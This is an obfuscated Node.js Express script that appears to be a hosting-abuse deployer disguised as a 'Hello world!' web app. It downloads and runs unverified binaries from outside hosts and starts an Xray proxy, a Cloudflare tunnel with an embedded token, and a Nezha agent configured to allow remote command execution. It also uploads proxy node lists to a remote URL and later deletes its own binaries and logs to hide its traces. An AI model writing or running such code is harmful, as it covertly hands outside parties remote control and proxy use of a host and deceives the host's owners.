const _0x4a943b=_0x276b;(function(_0x56a80a,_0xfb63d){const _0x5e35be=_0x276b,_0x1fc1a9=_0x56a80a();while(!![]){try{const _0x536421=-parseInt(_0x5e35be(0x215))/0x1*(-parseInt(_0x5e35be(0x273))/0x2)+parseInt(_0x5e35be(0x252))/0x3*(parseInt(_0x5e35be(0x1e2))/0x4)+parseInt(_0x5e35be(0x26f))/0x5*(-parseInt(_0x5e35be(0x24e))/0x6)+parseInt(_0x5e35be(0x20a))/0x7*(parseInt(_0x5e35be(0x262))/0x8)+-parseInt(_0x5e35be(0x27a))/0x9*(parseInt(_0x5e35be(0x225))/0xa)+-parseInt(_0x5e35be(0x243))/0xb*(-parseInt(_0x5e35be(0x1e8))/0xc)+-parseInt(_0x5e35be(0x263))/0xd;if(_0x536421===_0xfb63d)break;else _0x1fc1a9['push'](_0x1fc1a9['shift']());}catch(_0x306078){_0x1fc1a9['push'](_0x1fc1a9['shift']());}}}(_0xce4c,0x36511));const express=require(_0x4a943b(0x213)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x4a943b(0x1da)),{promisify}=require(_0x4a943b(0x258)),exec=promisify(require(_0x4a943b(0x233))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x4a943b(0x1de)][_0x4a943b(0x247)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x4a943b(0x27d)]||![],FILE_PATH=process['env'][_0x4a943b(0x207)]||_0x4a943b(0x1fa),SUB_PATH=process[_0x4a943b(0x1de)][_0x4a943b(0x202)]||_0x4a943b(0x25e),PORT=process[_0x4a943b(0x1de)][_0x4a943b(0x1fc)]||process[_0x4a943b(0x1de)][_0x4a943b(0x248)]||0xbb8,UUID=process[_0x4a943b(0x1de)][_0x4a943b(0x1fb)]||_0x4a943b(0x26a),NEZHA_SERVER=process[_0x4a943b(0x1de)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x4a943b(0x1f3)]||'',NEZHA_KEY=process[_0x4a943b(0x1de)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x4a943b(0x1de)]['ARGO_DOMAIN']||_0x4a943b(0x232),ARGO_AUTH=process[_0x4a943b(0x1de)][_0x4a943b(0x266)]||'eyJhIjoiM2JjYWI3OWVlZTRmNjViMWIxNzg5NTlkNmIxMjFlNTUiLCJ0IjoiNjIyYmY1ZDMtODQyNy00NTYzLTgzYmItODQzNmJiZmFhNTlhIiwicyI6Ik5UTXpabVppWXpndE4yUmxaQzAwTWpNekxUZzBaR1l0TjJFeE1XTTNNVFpoTXpReiJ9',ARGO_PORT=process[_0x4a943b(0x1de)][_0x4a943b(0x1d5)]||0x1f41,CFIP=process[_0x4a943b(0x1de)][_0x4a943b(0x20d)]||'cdns.doon.eu.org',CFPORT=process['env']['CFPORT']||0x1bb,NAME=process['env']['NAME']||'';!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x4a943b(0x240)](FILE_PATH+_0x4a943b(0x20b))):console[_0x4a943b(0x240)](FILE_PATH+_0x4a943b(0x1dd));function generateRandomName(){const _0x228afc=_0x4a943b,_0x3525f1=_0x228afc(0x224);let _0x20f4c4='';for(let _0xf30db4=0x0;_0xf30db4<0x6;_0xf30db4++){_0x20f4c4+=_0x3525f1[_0x228afc(0x1f7)](Math[_0x228afc(0x26c)](Math[_0x228afc(0x21e)]()*_0x3525f1['length']));}return _0x20f4c4;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4a943b(0x218)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x4a943b(0x218)](FILE_PATH,webName),botPath=path[_0x4a943b(0x218)](FILE_PATH,botName),subPath=path[_0x4a943b(0x218)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x4a943b(0x218)](FILE_PATH,_0x4a943b(0x1dc)),configPath=path[_0x4a943b(0x218)](FILE_PATH,_0x4a943b(0x1f8));function deleteNodes(){const _0x109f44=_0x4a943b;try{if(!UPLOAD_URL)return;if(!fs[_0x109f44(0x254)](subPath))return;let _0x1e063a;try{_0x1e063a=fs[_0x109f44(0x1f1)](subPath,_0x109f44(0x208));}catch{return null;}const _0x2f3428=Buffer[_0x109f44(0x22d)](_0x1e063a,_0x109f44(0x26b))['toString'](_0x109f44(0x208)),_0x1d06b0=_0x2f3428[_0x109f44(0x1d6)]('\x0a')['filter'](_0x2830a8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x109f44(0x275)](_0x2830a8));if(_0x1d06b0[_0x109f44(0x1f0)]===0x0)return;return axios['post'](UPLOAD_URL+_0x109f44(0x22c),JSON[_0x109f44(0x261)]({'nodes':_0x1d06b0}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x442924=>{return null;}),null;}catch(_0x58323b){return null;}}function cleanupOldFiles(){try{const _0x44d3d1=fs['readdirSync'](FILE_PATH);_0x44d3d1['forEach'](_0xa9330e=>{const _0x5758b4=_0x276b,_0x22637a=path[_0x5758b4(0x218)](FILE_PATH,_0xa9330e);try{const _0x490039=fs[_0x5758b4(0x26e)](_0x22637a);_0x490039['isFile']()&&fs[_0x5758b4(0x1f6)](_0x22637a);}catch(_0x3c19e3){}});}catch(_0x425008){}}app[_0x4a943b(0x230)]('/',function(_0xc69bef,_0x30ce32){const _0x332108=_0x4a943b;_0x30ce32[_0x332108(0x21d)](_0x332108(0x21a));});async function generateConfig(){const _0x205706=_0x4a943b,_0x245018={'log':{'access':_0x205706(0x1e5),'error':_0x205706(0x1e5),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x205706(0x274),'settings':{'clients':[{'id':UUID,'flow':_0x205706(0x1cf)}],'decryption':_0x205706(0x24d),'fallbacks':[{'dest':0xbb9},{'path':_0x205706(0x1ef),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x205706(0x1e4),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x205706(0x249),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x205706(0x24d)},'streamSettings':{'network':_0x205706(0x1e0),'security':_0x205706(0x24d)}},{'port':0xbba,'listen':_0x205706(0x249),'protocol':_0x205706(0x274),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x205706(0x24d),'wsSettings':{'path':_0x205706(0x1ef)}},'sniffing':{'enabled':!![],'destOverride':[_0x205706(0x23c),_0x205706(0x226),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x205706(0x249),'protocol':_0x205706(0x1db),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x205706(0x23c),_0x205706(0x226),_0x205706(0x1e7)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x205706(0x228),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x205706(0x24d),'wsSettings':{'path':_0x205706(0x1e4)}},'sniffing':{'enabled':!![],'destOverride':[_0x205706(0x23c),_0x205706(0x226),_0x205706(0x1e7)],'metadataOnly':![]}}],'dns':{'servers':[_0x205706(0x236)]},'outbounds':[{'protocol':_0x205706(0x1d9),'tag':_0x205706(0x1ec)},{'protocol':_0x205706(0x23a),'tag':_0x205706(0x21b)}]};fs[_0x205706(0x272)](path[_0x205706(0x218)](FILE_PATH,_0x205706(0x1f8)),JSON['stringify'](_0x245018,null,0x2));}function getSystemArchitecture(){const _0x32db9f=_0x4a943b,_0x20ca2e=os[_0x32db9f(0x251)]();return _0x20ca2e===_0x32db9f(0x21c)||_0x20ca2e===_0x32db9f(0x20c)||_0x20ca2e==='aarch64'?_0x32db9f(0x21c):_0x32db9f(0x1fe);}function downloadFile(_0x1c81bf,_0xfb3368,_0xca8084){const _0x5d6207=_0x4a943b,_0x573526=_0x1c81bf;!fs[_0x5d6207(0x254)](FILE_PATH)&&fs[_0x5d6207(0x253)](FILE_PATH,{'recursive':!![]});const _0x8e642a=fs['createWriteStream'](_0x573526);axios({'method':_0x5d6207(0x230),'url':_0xfb3368,'responseType':_0x5d6207(0x223)})[_0x5d6207(0x214)](_0x5805d9=>{const _0xf66fc0=_0x5d6207;_0x5805d9[_0xf66fc0(0x1f5)][_0xf66fc0(0x21f)](_0x8e642a),_0x8e642a['on'](_0xf66fc0(0x25d),()=>{const _0x3f307b=_0xf66fc0;_0x8e642a[_0x3f307b(0x1ca)](),console[_0x3f307b(0x240)](_0x3f307b(0x1d0)+path[_0x3f307b(0x1df)](_0x573526)+_0x3f307b(0x27b)),_0xca8084(null,_0x573526);}),_0x8e642a['on'](_0xf66fc0(0x22b),_0x2d5b50=>{const _0xb7ed3f=_0xf66fc0;fs[_0xb7ed3f(0x1e1)](_0x573526,()=>{});const _0x2f4892=_0xb7ed3f(0x1d0)+path[_0xb7ed3f(0x1df)](_0x573526)+_0xb7ed3f(0x1d4)+_0x2d5b50[_0xb7ed3f(0x23b)];console[_0xb7ed3f(0x22b)](_0x2f4892),_0xca8084(_0x2f4892);});})['catch'](_0x457013=>{const _0x10f49d=_0x5d6207,_0x35245f=_0x10f49d(0x1d0)+path[_0x10f49d(0x1df)](_0x573526)+'\x20failed:\x20'+_0x457013['message'];console[_0x10f49d(0x22b)](_0x35245f),_0xca8084(_0x35245f);});}async function downloadFilesAndRun(){const _0x58ab3e=_0x4a943b,_0x3c3c50=getSystemArchitecture(),_0x880299=getFilesForArchitecture(_0x3c3c50);if(_0x880299[_0x58ab3e(0x1f0)]===0x0){console['log'](_0x58ab3e(0x216));return;}const _0x11a114=_0x880299[_0x58ab3e(0x220)](_0x1dc604=>{return new Promise((_0x51c6a2,_0x5c251a)=>{const _0xacaad0=_0x276b;downloadFile(_0x1dc604[_0xacaad0(0x205)],_0x1dc604[_0xacaad0(0x1ee)],(_0x34482e,_0x5c7377)=>{_0x34482e?_0x5c251a(_0x34482e):_0x51c6a2(_0x5c7377);});});});try{await Promise[_0x58ab3e(0x24a)](_0x11a114);}catch(_0x318e78){console[_0x58ab3e(0x22b)](_0x58ab3e(0x1ea),_0x318e78);return;}function _0x30412b(_0x501205){const _0x447667=_0x58ab3e,_0x5e10ce=0x1fd;_0x501205[_0x447667(0x260)](_0x3ef2df=>{const _0x38af3a=_0x447667;fs[_0x38af3a(0x254)](_0x3ef2df)&&fs['chmod'](_0x3ef2df,_0x5e10ce,_0x359ad3=>{const _0x313468=_0x38af3a;_0x359ad3?console[_0x313468(0x22b)](_0x313468(0x1cd)+_0x3ef2df+':\x20'+_0x359ad3):console['log'](_0x313468(0x201)+_0x3ef2df+':\x20'+_0x5e10ce[_0x313468(0x20e)](0x8));});});}const _0x17522c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x30412b(_0x17522c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x998490=NEZHA_SERVER[_0x58ab3e(0x279)](':')?NEZHA_SERVER[_0x58ab3e(0x1d6)](':')[_0x58ab3e(0x242)]():'',_0x29c603=new Set([_0x58ab3e(0x1fd),_0x58ab3e(0x22e),'2096',_0x58ab3e(0x24c),'2083',_0x58ab3e(0x250)]),_0x5dd0e4=_0x29c603[_0x58ab3e(0x1cb)](_0x998490)?_0x58ab3e(0x245):_0x58ab3e(0x1e6),_0x12b9a0=_0x58ab3e(0x1d1)+NEZHA_KEY+_0x58ab3e(0x231)+NEZHA_SERVER+_0x58ab3e(0x280)+_0x5dd0e4+_0x58ab3e(0x206)+UUID;fs[_0x58ab3e(0x272)](path['join'](FILE_PATH,'config.yaml'),_0x12b9a0);const _0xb67ff5='nohup\x20'+phpPath+_0x58ab3e(0x265)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0xb67ff5),console[_0x58ab3e(0x240)](phpName+_0x58ab3e(0x1f4)),await new Promise(_0x4d401=>setTimeout(_0x4d401,0x3e8));}catch(_0x129bcc){console[_0x58ab3e(0x22b)]('php\x20running\x20error:\x20'+_0x129bcc);}}else{let _0x111820='';const _0x165083=[_0x58ab3e(0x1fd),'8443','2096','2087',_0x58ab3e(0x1e3),'2053'];_0x165083[_0x58ab3e(0x279)](NEZHA_PORT)&&(_0x111820=_0x58ab3e(0x1d2));const _0x369ee2=_0x58ab3e(0x237)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x58ab3e(0x241)+NEZHA_KEY+'\x20'+_0x111820+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x369ee2),console['log'](npmName+_0x58ab3e(0x1f4)),await new Promise(_0x293f36=>setTimeout(_0x293f36,0x3e8));}catch(_0x56e1e8){console[_0x58ab3e(0x22b)]('npm\x20running\x20error:\x20'+_0x56e1e8);}}}else console[_0x58ab3e(0x240)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x545ed1=_0x58ab3e(0x237)+webPath+_0x58ab3e(0x204)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x545ed1),console['log'](webName+_0x58ab3e(0x1f4)),await new Promise(_0x3cb2cb=>setTimeout(_0x3cb2cb,0x3e8));}catch(_0x222368){console[_0x58ab3e(0x22b)](_0x58ab3e(0x268)+_0x222368);}if(fs[_0x58ab3e(0x254)](botPath)){let _0x3173dc;if(ARGO_AUTH[_0x58ab3e(0x229)](/^[A-Z0-9a-z=]{120,250}$/))_0x3173dc='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x58ab3e(0x229)](/TunnelSecret/)?_0x3173dc=_0x58ab3e(0x1ce)+FILE_PATH+_0x58ab3e(0x246):_0x3173dc='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x58ab3e(0x210)+ARGO_PORT;try{await exec(_0x58ab3e(0x237)+botPath+'\x20'+_0x3173dc+_0x58ab3e(0x1d3)),console[_0x58ab3e(0x240)](botName+_0x58ab3e(0x1f4)),await new Promise(_0x811b8f=>setTimeout(_0x811b8f,0x7d0));}catch(_0x5f364b){console[_0x58ab3e(0x22b)]('Error\x20executing\x20command:\x20'+_0x5f364b);}}await new Promise(_0x2c022b=>setTimeout(_0x2c022b,0x1388));}function getFilesForArchitecture(_0x96bfa2){const _0x29fc62=_0x4a943b;let _0x32f12b;_0x96bfa2===_0x29fc62(0x21c)?_0x32f12b=[{'fileName':webPath,'fileUrl':_0x29fc62(0x244)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x32f12b=[{'fileName':webPath,'fileUrl':_0x29fc62(0x1cc)},{'fileName':botPath,'fileUrl':_0x29fc62(0x22a)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x13a59c=_0x96bfa2==='arm'?_0x29fc62(0x25c):_0x29fc62(0x23e);_0x32f12b['unshift']({'fileName':npmPath,'fileUrl':_0x13a59c});}else{const _0x324c16=_0x96bfa2==='arm'?_0x29fc62(0x26d):'https://amd64.ssss.nyc.mn/v1';_0x32f12b[_0x29fc62(0x1d7)]({'fileName':phpPath,'fileUrl':_0x324c16});}}return _0x32f12b;}function _0x276b(_0x1325b7,_0x26a95e){const _0xce4cc7=_0xce4c();return _0x276b=function(_0x276be5,_0x44bc9e){_0x276be5=_0x276be5-0x1ca;let _0x3e15d4=_0xce4cc7[_0x276be5];return _0x3e15d4;},_0x276b(_0x1325b7,_0x26a95e);}function argoType(){const _0x45d8ad=_0x4a943b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x45d8ad(0x240)](_0x45d8ad(0x264));return;}if(ARGO_AUTH['includes'](_0x45d8ad(0x1eb))){fs[_0x45d8ad(0x272)](path['join'](FILE_PATH,_0x45d8ad(0x1ff)),ARGO_AUTH);const _0x255d50=_0x45d8ad(0x20f)+ARGO_AUTH['split']('\x22')[0xb]+_0x45d8ad(0x257)+path[_0x45d8ad(0x218)](FILE_PATH,_0x45d8ad(0x1ff))+_0x45d8ad(0x23f)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x45d8ad(0x272)](path[_0x45d8ad(0x218)](FILE_PATH,_0x45d8ad(0x23d)),_0x255d50);}else console[_0x45d8ad(0x240)](_0x45d8ad(0x276));}argoType();async function extractDomains(){const _0x5e1451=_0x4a943b;let _0x21ff60;if(ARGO_AUTH&&ARGO_DOMAIN)_0x21ff60=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x21ff60),await _0x2cce39(_0x21ff60);else try{const _0x402131=fs['readFileSync'](path[_0x5e1451(0x218)](FILE_PATH,_0x5e1451(0x1dc)),'utf-8'),_0x257bb8=_0x402131[_0x5e1451(0x1d6)]('\x0a'),_0x33371d=[];_0x257bb8['forEach'](_0x1ddc83=>{const _0x5602fc=_0x5e1451,_0x585599=_0x1ddc83['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x585599){const _0x1a9a8a=_0x585599[0x1];_0x33371d[_0x5602fc(0x27c)](_0x1a9a8a);}});if(_0x33371d[_0x5e1451(0x1f0)]>0x0)_0x21ff60=_0x33371d[0x0],console['log'](_0x5e1451(0x256),_0x21ff60),await _0x2cce39(_0x21ff60);else{console[_0x5e1451(0x240)](_0x5e1451(0x255)),fs[_0x5e1451(0x1f6)](path[_0x5e1451(0x218)](FILE_PATH,'boot.log'));async function _0x14a174(){const _0x97f508=_0x5e1451;try{process[_0x97f508(0x234)]===_0x97f508(0x221)?await exec(_0x97f508(0x277)+botName+_0x97f508(0x222)):await exec(_0x97f508(0x217)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x97f508(0x271));}catch(_0x4b902f){}}_0x14a174(),await new Promise(_0x2ad933=>setTimeout(_0x2ad933,0xbb8));const _0x2697cd='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x5e1451(0x210)+ARGO_PORT;try{await exec(_0x5e1451(0x237)+botPath+'\x20'+_0x2697cd+_0x5e1451(0x1d3)),console[_0x5e1451(0x240)](botName+_0x5e1451(0x1f4)),await new Promise(_0x182100=>setTimeout(_0x182100,0xbb8)),await extractDomains();}catch(_0x1f4e05){console[_0x5e1451(0x22b)](_0x5e1451(0x270)+_0x1f4e05);}}}catch(_0x2da76a){console['error']('Error\x20reading\x20boot.log:',_0x2da76a);}async function _0x2cce39(_0x1f54e2){const _0x56aec2=_0x5e1451,_0x497510=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x56aec2(0x208)}),_0x550fec=_0x497510[_0x56aec2(0x24b)](),_0x2bed02=NAME?NAME+'-'+_0x550fec:_0x550fec;return new Promise(_0x482137=>{setTimeout(()=>{const _0xf28a25=_0x276b,_0x5262c8={'v':'2','ps':''+_0x2bed02,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xf28a25(0x24d),'net':'ws','type':_0xf28a25(0x24d),'host':_0x1f54e2,'path':_0xf28a25(0x212),'tls':_0xf28a25(0x226),'sni':_0x1f54e2,'alpn':'','fp':_0xf28a25(0x278)},_0x4bf1e0=_0xf28a25(0x238)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x1f54e2+'&fp=firefox&type=ws&host='+_0x1f54e2+_0xf28a25(0x269)+_0x2bed02+'\x0a\x20\x20\x0avmess://'+Buffer['from'](JSON[_0xf28a25(0x261)](_0x5262c8))[_0xf28a25(0x20e)]('base64')+_0xf28a25(0x211)+UUID+'@'+CFIP+':'+CFPORT+_0xf28a25(0x24f)+_0x1f54e2+_0xf28a25(0x25f)+_0x1f54e2+_0xf28a25(0x25a)+_0x2bed02+_0xf28a25(0x267);console[_0xf28a25(0x240)](Buffer[_0xf28a25(0x22d)](_0x4bf1e0)[_0xf28a25(0x20e)]('base64')),fs[_0xf28a25(0x272)](subPath,Buffer[_0xf28a25(0x22d)](_0x4bf1e0)[_0xf28a25(0x20e)](_0xf28a25(0x26b))),console[_0xf28a25(0x240)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0xf28a25(0x230)]('/'+SUB_PATH,(_0x1479df,_0x1b13db)=>{const _0x1eac65=_0xf28a25,_0x35f796=Buffer['from'](_0x4bf1e0)[_0x1eac65(0x20e)](_0x1eac65(0x26b));_0x1b13db['set'](_0x1eac65(0x1f9),'text/plain;\x20charset=utf-8'),_0x1b13db[_0x1eac65(0x21d)](_0x35f796);}),_0x482137(_0x4bf1e0);},0x7d0);});}}async function uploadNodes(){const _0x399601=_0x4a943b;if(UPLOAD_URL&&PROJECT_URL){const _0x5ec3e9=PROJECT_URL+'/'+SUB_PATH,_0x290f58={'subscription':[_0x5ec3e9]};try{const _0x10a470=await axios['post'](UPLOAD_URL+_0x399601(0x1e9),_0x290f58,{'headers':{'Content-Type':'application/json'}});return _0x10a470&&_0x10a470[_0x399601(0x1d8)]===0xc8?(console['log'](_0x399601(0x259)),_0x10a470):null;}catch(_0x3eddb6){if(_0x3eddb6['response']){if(_0x3eddb6['response'][_0x399601(0x1d8)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x399601(0x254)](listPath))return;const _0x52823b=fs[_0x399601(0x1f1)](listPath,'utf-8'),_0x468c9c=_0x52823b['split']('\x0a')['filter'](_0x31984e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x31984e));if(_0x468c9c[_0x399601(0x1f0)]===0x0)return;const _0x2c5d65=JSON[_0x399601(0x261)]({'nodes':_0x468c9c});try{const _0x234c20=await axios['post'](UPLOAD_URL+_0x399601(0x27f),_0x2c5d65,{'headers':{'Content-Type':_0x399601(0x1ed)}});return _0x234c20&&_0x234c20[_0x399601(0x1d8)]===0xc8?(console[_0x399601(0x240)]('Nodes\x20uploaded\x20successfully'),_0x234c20):null;}catch(_0x1876fa){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1a978f=_0x276b,_0x58e42f=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x58e42f[_0x1a978f(0x27c)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x58e42f[_0x1a978f(0x27c)](phpPath);process['platform']===_0x1a978f(0x221)?exec('del\x20/f\x20/q\x20'+_0x58e42f[_0x1a978f(0x218)]('\x20')+'\x20>\x20nul\x202>&1',_0x19e790=>{const _0x16ef6a=_0x1a978f;console[_0x16ef6a(0x235)](),console['log'](_0x16ef6a(0x1f2)),console[_0x16ef6a(0x240)](_0x16ef6a(0x25b));}):exec(_0x1a978f(0x219)+_0x58e42f['join']('\x20')+_0x1a978f(0x200),_0x140147=>{const _0x2ef44c=_0x1a978f;console[_0x2ef44c(0x235)](),console[_0x2ef44c(0x240)](_0x2ef44c(0x1f2)),console[_0x2ef44c(0x240)](_0x2ef44c(0x25b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x52b5f5=_0x4a943b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x52b5f5(0x240)](_0x52b5f5(0x22f));return;}try{const _0x1684b8=await axios[_0x52b5f5(0x239)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x52b5f5(0x240)]('automatic\x20access\x20task\x20added\x20successfully'),_0x1684b8;}catch(_0x1bf6c9){return console[_0x52b5f5(0x22b)](_0x52b5f5(0x27e)+_0x1bf6c9[_0x52b5f5(0x23b)]),null;}}async function startserver(){const _0x455081=_0x4a943b;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x7fce5b){console[_0x455081(0x22b)]('Error\x20in\x20startserver:',_0x7fce5b);}}function _0xce4c(){const _0x1de5cd=['Unhandled\x20error\x20in\x20startserver:','\x20-c\x20','fileName','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','FILE_PATH','utf-8','http\x20server\x20is\x20running\x20on\x20port:','2541462QNCXjm','\x20is\x20created','arm64','CFIP','toString','\x0a\x20\x20tunnel:\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20\x0atrojan://','/vmess-argo?ed=2560','express','then','645fXPfmZ','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','pkill\x20-f\x20\x22[','join','rm\x20-rf\x20','Hello\x20world!','block','arm','send','random','pipe','map','win32','.exe\x20>\x20nul\x202>&1','stream','abcdefghijklmnopqrstuvwxyz','3117020tQLxOa','tls','catch','trojan','match','https://amd64.ssss.nyc.mn/bot','error','/api/delete-nodes','from','8443','Skipping\x20adding\x20automatic\x20access\x20task','get','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','bricks.e.0.d.b.0.d.0.0.1.0.a.2.ip6.arpa','child_process','platform','clear','https+local://8.8.8.8/dns-query','nohup\x20','\x0avless://','post','blackhole','message','http','tunnel.yml','https://amd64.ssss.nyc.mn/agent','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','log','\x20-p\x20','pop','18799ycVjvH','https://arm64.ssss.nyc.mn/web','true','/tunnel.yml\x20run','UPLOAD_URL','PORT','127.0.0.1','all','trim','2087','none','84lgAbjh','?security=tls&sni=','2053','arch','9231QPVNiy','mkdirSync','existsSync','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','ArgoDomain:','\x0a\x20\x20credentials-file:\x20','util','Subscription\x20uploaded\x20successfully','&path=%2Ftrojan-argo%3Fed%3D2560#','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://arm64.ssss.nyc.mn/agent','finish','sub','&fp=firefox&type=ws&host=','forEach','stringify','8fdDmbp','7390708BRcMYX','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20-c\x20\x22','ARGO_AUTH','\x0a\x20\x20\x20\x20','web\x20running\x20error:\x20','&path=%2Fvless-argo%3Fed%3D2560#','98061cae-ae62-4ed5-b2d5-de4babf4deff','base64','floor','https://arm64.ssss.nyc.mn/v1','statSync','64305oDosYT','Error\x20executing\x20command:\x20','\x22\x20>\x20/dev/null\x202>&1','writeFileSync','1162nCTpbC','vless','test','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','taskkill\x20/f\x20/im\x20','firefox','includes','9YdHQjL','\x20successfully','push','AUTO_ACCESS','Add\x20automatic\x20access\x20task\x20faild:\x20','/api/add-nodes','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','close','has','https://amd64.ssss.nyc.mn/web','Empowerment\x20failed\x20for\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','xtls-rprx-vision','Download\x20','\x0aclient_secret:\x20','--tls','\x20>/dev/null\x202>&1\x20&','\x20failed:\x20','ARGO_PORT','split','unshift','status','freedom','path','vmess','boot.log','\x20already\x20exists','env','basename','tcp','unlink','564uURkpi','2083','/trojan-argo','/dev/null','false','quic','780LJjhXo','/api/add-subscriptions','Error\x20downloading\x20files:','TunnelSecret','direct','application/json','fileUrl','/vless-argo','length','readFileSync','App\x20is\x20running','NEZHA_PORT','\x20is\x20running','data','unlinkSync','charAt','config.json','Content-Type','./tmp','UUID','SERVER_PORT','443','amd','tunnel.json','\x20>/dev/null\x202>&1','Empowerment\x20success\x20for\x20','SUB_PATH'];_0xce4c=function(){return _0x1de5cd;};return _0xce4c();}startserver()[_0x4a943b(0x227)](_0x3d1f08=>{const _0x40ef6b=_0x4a943b;console[_0x40ef6b(0x22b)](_0x40ef6b(0x203),_0x3d1f08);}),app['listen'](PORT,()=>console[_0x4a943b(0x240)](_0x4a943b(0x209)+PORT+'!'));
